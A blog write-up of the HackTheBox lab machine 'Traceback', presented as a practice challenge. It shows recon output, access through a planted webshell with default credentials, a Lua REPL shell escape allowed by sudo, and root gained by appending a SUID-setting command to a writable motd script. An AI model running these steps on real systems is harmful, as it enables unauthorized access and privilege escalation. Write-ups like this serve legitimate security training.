---
title: Traceback
date: 2022-06-16 
categories: [HackTheBox, Easy]
tags: [writeup, linux]     # TAG names should always be lowercase
author: Derrick
---

![](https://i.imgur.com/dVPTnt8.png)

Traceback is one of the boxes I am proud of doing not because of its difficulty, but how fast I was able to gain root on it. Granted, the "hacker" who this box's premise revolved around, left hints that were brutally obvious. This was one of the first times that I did not run into a wall while solving the box. The attack vector was very clear from start to finish.

## Recon
---
`nmap -sVC 10.10.10.181`
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-15 20:37 EDT
Nmap scan report for traceback.htb (10.10.10.181)
Host is up (0.083s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache/2.4.29 (Ubuntu)
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.43 seconds
```

![](https://i.imgur.com/tc6BJGj.png)


Apparently theres a backdoor somewhere. Its probably a webshell of some sort.

`gobuster dir -u http://10.10.10.181 -w /usr/share/seclists/Web-Shells/backdoor_list.txt`
```    
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.181
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Web-Shells/backdoor_list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/15 20:41:50 Starting gobuster in directory enumeration mode
===============================================================
/smevk.php            (Status: 200) [Size: 1261]                
===============================================================
```

![](https://i.imgur.com/iFWnKhI.png)

Looks like we got some sort of webshell.

![](https://i.imgur.com/ewcBU6Q.png)
Based on the github repo for this specific webshell, the default creds are just admin admin so lets test that.

![](https://i.imgur.com/wjLCXwc.png)

After some play testing, heres my conclusion about this webshell
* its pretty janky
* we have file write
* attemped a reverse shell but something went wrong

Upload my ssh key into the .ssh directory and ssh in.

`ssh webadmin@traceback.htb`
```
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Jun 15 18:10:25 2022 from 10.10.14.19
webadmin@traceback:~$ 
```

Worked perfectly however this is not user. sysadmin is the user and we need to pivot to them.
> It is also worth noting that message of the day when sshing in
{: .prompt-idea }

`sudo -l`
```
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

`cat note.txt `
```
- sysadmin -
I have left a tool to practice Lua.
Im sure you know where to find it.
Contact me if you have any question.
```

Couple of interesting finds. Note.txt is referring to some sort of Lua program and `sudo -l` references luvit which is a lua program. Putting two and two together, we can abuse the lua program to spawn a shell as our user. Running the program just executes lua commands so we can just simply spawn a shell.

Demo:
```
Welcome to the Luvit repl!
> os.execute('/bin/sh')
$ whoami
sysadmin
```

User obtained. Time for root.

## Root
---
```
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land
```

Revisiting the motd, the hacker seems to have left us a large hint moving forward.

`ls -la /etc/update-motd.d/`
```
total 32
drwxr-xr-x  2 root sysadmin 4096 Apr 22  2021 .
drwxr-xr-x 80 root root     4096 Apr 22  2021 ..
-rwxrwxr-x  1 root sysadmin  981 Jun 15 19:39 00-header
-rwxrwxr-x  1 root sysadmin  982 Jun 15 19:39 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 Jun 15 19:39 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Jun 15 19:39 80-esm
-rwxrwxr-x  1 root sysadmin  299 Jun 15 19:39 91-release-upgrade
```
Looks like all of them are writable. These are scripts that are run when you logon to the box meaning we can just turn /bin/bash into an suid and run bash -p to gain root.

```bash
echo "chmod 7777 /bin/bash" >> /etc/update-motd.d/00-header
```

Then log out and relog on.

Demo:
```
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Jun 15 19:35:06 2022 from 10.10.14.19
-bash-4.4$ whoami
webadmin
-bash-4.4$ bash -p
bash-4.4# whoami
root
```

Pwned :)